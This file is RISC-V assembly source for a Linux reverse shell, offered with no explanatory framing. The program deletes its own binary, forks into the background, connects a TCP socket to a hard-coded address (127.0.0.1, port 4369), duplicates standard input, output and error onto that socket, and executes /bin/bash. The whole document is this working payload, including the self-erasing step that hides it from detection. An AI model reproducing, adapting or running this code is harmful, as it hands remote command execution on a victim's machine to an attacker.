	.text
	.globl _start
_start:
	li a7, 35      # unlinkat
	li a0, -100    # AT_FDCWD
	ld a1, 8(sp)   # argv[0]
	move a2, zero
	ecall
	
	li a7, 220   # clone
	#li a0, (CLONE_CHILD_SETTID + CLONE_CHILD_CLEARTID + SIGCHLD)
	li a0, 17
	move a1, zero
	#move a2, zero
	move a3, zero
	ecall
	bne a0, zero, exit
	move t1, a0

	li a7, 198  # socket
	li a0, 2
	li a1, 1
	li a2, 6
	ecall
	move t0, a0

	li a7, 203   # Connect
	la a1, addr
	li a2, 16
	ecall

	li a7, 24 # dup3
	move a0, t0
	move a1, zero
	move a2, zero
	ecall

	move a0, t0
	addi a1, a1, 1
	ecall

	move a0, t0
	addi a1, a1, 1
	ecall

	li a7, 221 # Exec
	la a0, shell
	move a1, zero
	ecall
	

exit:	
	# Exit
	li a7, 93
	li a0, 0
	ecall


shell:  .asciz "/bin/bash"
addr:	.quad 0x0100007f11110002
#addr:	.quad 0x000211117f000001


